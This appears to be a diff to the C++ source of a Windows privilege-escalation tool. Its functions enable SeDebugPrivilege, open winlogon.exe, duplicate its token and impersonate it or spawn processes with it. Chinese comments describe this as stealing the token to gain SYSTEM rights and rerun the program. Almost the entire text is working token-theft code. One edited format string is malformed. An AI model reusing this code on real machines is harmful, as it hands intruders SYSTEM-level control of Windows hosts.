@@ -7,6 +7,7 @@
 
 extern HINSTANCE hInst;
 
+// 启用某个特权
 BOOL SetPrivilege(
 	HANDLE hToken,          // access token handle
 	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
@@ -21,7 +22,7 @@ BOOL SetPrivilege(
 		lpszPrivilege,   // privilege to lookup 
 		&luid))        // receives LUID of privilege
 	{
-		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
+		printf("SetPrivilege: LookupPrivilegeValue error: %u\n", GetLastError());
 		return FALSE;
 	}
 
@@ -32,8 +33,6 @@ BOOL SetPrivilege(
 	else
 		tp.Privileges[0].Attributes = 0;
 
-	// Enable the privilege or disable all privileges.
-
 	if (!AdjustTokenPrivileges(
 		hToken,
 		FALSE,
@@ -42,20 +41,20 @@ BOOL SetPrivilege(
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
+		printf("SetPrivilege: AdjustTokenPrivileges error: %u\n", GetLastError());
 		return FALSE;
 	}
 
 	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-
 	{
-		printf("[-] The token does not have the specified privilege. \n");
+		printf("SetPrivilege: The token does not have the specified privilege. \n");
 		return FALSE;
 	}
 
 	return TRUE;
 }
 
+// 获取当前用户名
 std::string get_username()
 {
 	TCHAR username[UNLEN + 1];
@@ -67,10 +66,10 @@ std::string get_username()
 }
 
 // 第二个参数为NULL的时候, 第三个参数中指定可执行文件路径
-bool ElevateExecute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
+BOOL ElevatedExecute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
 {
 	// Print whoami to compare to thread later
-	printf("[+] Current user is: %s\n", (get_username()).c_str());
+	printf("ElevateExecute: Current user is: %s\n", (get_username()).c_str());
 
 	// Initialize variables and structures
 	HANDLE tokenHandle = NULL;
@@ -114,7 +113,6 @@ bool ElevateExecute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
 		ret =  FALSE;
 	}
 
-	// Call DuplicateTokenEx(), print return code and error code
 	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
 	if (GetLastError() == NULL)
 		printf("[+] DuplicateTokenEx() success!\n");
@@ -125,7 +123,6 @@ bool ElevateExecute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
 		ret = FALSE;
 	}
 
-	// Call CreateProcessWithTokenW(), print return code and error code
 	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, executable_path, command_line, 0, NULL, NULL, &startupInfo, &processInformation);
 	if (GetLastError() == NULL)
 		printf("[+] Process spawned!\n");
@@ -139,12 +136,11 @@ bool ElevateExecute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
 	return ret;
 }
 
-bool ElevateSelf(DWORD pid)
+// 窃取对应PID的Token，用于提权
+BOOL ElevateSelf(DWORD pid)
 {
-	// Print whoami to compare to thread later
 	printf("[+] Current user is: %s\n", (get_username()).c_str());
 
-	// Initialize variables and structures
 	HANDLE tokenHandle = NULL;
 	HANDLE duplicateTokenHandle = NULL;
 	STARTUPINFO startupInfo;
@@ -154,7 +150,7 @@ bool ElevateSelf(DWORD pid)
 	startupInfo.cb = sizeof(STARTUPINFO);
 	BOOL ret = TRUE;
 
-	// Add SE debug privilege
+	// 开启 SEDebugPrivilege
 	HANDLE currentTokenHandle = NULL;
 	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
 	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
@@ -170,12 +166,11 @@ bool ElevateSelf(DWORD pid)
 		printf("[+] OpenProcess() success!\n");
 	else
 	{
-		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
+		printf("[-] OpenProcess() Return Code: %l\n", processHandle);
 		printf("[-] OpenProcess() Error: %i\n", GetLastError());
 		ret = FALSE;
 	}
 
-	// Call OpenProcessToken(), print return code and error code
 	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
 	if (GetLastError() == NULL)
 		printf("[+] OpenProcessToken() success!\n");
@@ -186,12 +181,11 @@ bool ElevateSelf(DWORD pid)
 		ret = FALSE;
 	}
 
-	// Impersonate user in a thread
+	// 提升当前线程的权限
 	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
 	if (GetLastError() == NULL)
 	{
 		printf("[+] ImpersonatedLoggedOnUser() success!\n");
-		printf("[+] Current user is: %s\n", (get_username()).c_str());
 	}
 	else
 	{
@@ -199,37 +193,45 @@ bool ElevateSelf(DWORD pid)
 		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
 		ret = FALSE;
 	}
+	printf("[+] Current user is: %s\n", (get_username()).c_str());
 	return ret;
 }
 
-bool ElevateSelf()
-{
-	DWORD pid = GetPIDByName(L"winlogon.exe");
-	
-	return ElevateSelf(pid);
-}
-
-bool ElevateExecute(LPCWSTR executable_path, LPWSTR command_line)
+// 窃取winlogon.exe的Token提升到SYSTEM权限
+BOOL ElevateSelf()
 {
 	DWORD pid = GetPIDByName(L"winlogon.exe");
 	if (pid == NULL)
 	{
-		puts("elevate_execute: Unable to get pid of winlogon.exe.");
+		puts("ElevateSelf: Unable to get pid of winlogon.exe.");
 		return FALSE;
 	}
-	return ElevateExecute(pid, executable_path, command_line);
+	return ElevateSelf(pid);
 }
 
+// 窃取winlogon.exe的Token并执行其他程序
+BOOL ElevatedExecute(LPCWSTR executable_path, LPWSTR command_line)
+{
+	DWORD pid = GetPIDByName(L"winlogon.exe");
+	if (pid == NULL)
+	{
+		puts("ElevatedExecute: Unable to get pid of winlogon.exe.");
+		return FALSE;
+	}
+	return ElevatedExecute(pid, executable_path, command_line);
+}
+
+// 窃取winlogon.exe的Token并执行自己
 BOOL GetSystem(LPCWSTR self_cmd)
 {
 	DWORD pid = GetPIDByName(L"winlogon.exe");
 	if (pid == NULL)
 	{
-		puts("get_system: Unable to get pid of winlogon.exe.");
+		puts("GetSystem: Unable to get pid of winlogon.exe.");
 		return FALSE;
 	}
 	LPWSTR command_line2 = lstrcat_heap(commandline, self_cmd);
-	std::wcout << command_line2 << std::endl;
+	std::wcout << L"GetSystem: " << command_line2 << std::endl;
 	
-	return ElevateExecute(pid, NULL, command_line2);
+	return ElevatedExecute(pid, NULL, command_line2);
 }
